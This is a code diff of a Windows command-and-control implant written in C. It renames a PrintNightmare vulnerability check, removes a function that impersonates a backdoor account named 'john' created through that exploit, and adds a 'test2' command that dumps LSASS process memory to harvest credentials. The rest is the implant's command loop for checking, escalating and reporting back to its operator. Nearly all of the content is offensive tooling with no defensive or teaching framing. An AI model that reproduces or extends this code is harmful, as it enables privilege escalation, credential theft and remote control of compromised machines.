@@ -1,5 +1,5 @@
 #include "c2_comms.h"
-
+#include "c2_proc.h"
 
 
 // Global heap handle
@@ -121,7 +121,7 @@ end:
 
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
-int check_registry_for_privesc() {
+int CheckForPrivEsc() {
     int vulnerable = 1;
     DWORD status;
     HKEY hKey = NULL;
@@ -221,28 +221,6 @@ char* DownloadScript() {
 }
 
 
-// Attempts to get the security token for the user "john"
-DWORD Impersonate() {
-    HANDLE hToken;
-    int status;
-
-    // Try to log on as the user we created from printer nightmare
-    status = LogonUserA("john", ".", "john", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);
-    if (status == 0) {
-        c2_log("[!] ERROR: could not log on", 27);
-        return -1;
-    }
-
-    // Imprtsonate the user to get their privs
-    status = ImpersonateLoggedOnUser(hToken);
-    if (status == 0) {
-        c2_log("[!] ERROR: could not impersonate", 32);
-        CloseHandle(hToken);
-        return -1;
-    }
-    CloseHandle(hToken);
-    return 0;
-}
 
 
 // Attempts to gain administrator privileges via the Printer Nightmare CVE.
@@ -258,7 +236,7 @@ DWORD Escalate() {
     startInfo.cb = sizeof(startInfo);
 
     // Check registry first
-    int vulnerable  = check_registry_for_privesc();
+    int vulnerable  = CheckForPrivEsc();
     if (vulnerable == 0) {
         c2_log("Target not vulnerable", 21);
         ret = -1;
@@ -391,17 +369,11 @@ int main() {
         }
 
         else if (strncmp(buffer, "check", 5) == 0) {
-            status = check_registry_for_privesc();
+            status = CheckForPrivEsc();
             if (status == 1) { c2_send("[+] Host vulnerable", 19); }
             else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
             else { c2_send("[!] Error in check", 18); }
         }
-
-        // else if (strncmp(buffer, "download", 8) == 0) {
-        //     char* path = DownloadScript();
-        //     c2_send(path, strlen(path));
-        //     Free(path);
-        // }
 
         else if (strncmp(buffer, "escalate", 8) == 0) {
             status = Escalate();
@@ -409,11 +381,16 @@ int main() {
             else { c2_send("[!] Error in privesc", 20); }
         }
 
-        // else if (strncmp(buffer, "impersonate", 11) == 0) {
-        //     status = Impersonate();
-        //     if (status == 0) { c2_send("[+] success", 11); }
-        //     else { c2_send("[!] failure", 11); } 
-        // }
+
+        else if (strncmp(buffer, "test2", 5) == 0) {
+            if (DumpLSASS(buffer + 6))
+                c2_log("dump succeeded\n");
+            else
+                c2_log("dump failed");
+            
+            c2_send("testing2", 8);
+        }
+
 
         else {
             c2_send("[!] Invalid command", 19);
